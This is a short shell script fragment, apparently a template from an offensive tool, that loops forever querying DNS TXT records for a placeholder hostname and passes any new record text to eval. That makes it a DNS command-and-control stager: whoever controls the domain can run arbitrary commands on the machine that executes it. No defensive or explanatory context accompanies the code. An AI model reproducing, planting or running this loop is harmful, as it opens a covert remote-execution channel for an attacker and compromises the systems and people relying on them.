while [ "$e" != "1" ]
do
	m=`nslookup -type=txt %q%.%hostname%|awk -F\" '$0=$2'|xargs`
	if [ "$m" != "$n" ]&&[ ${#m} -gt 1 ]; then
		n=$m;
		eval $m;
	fi
done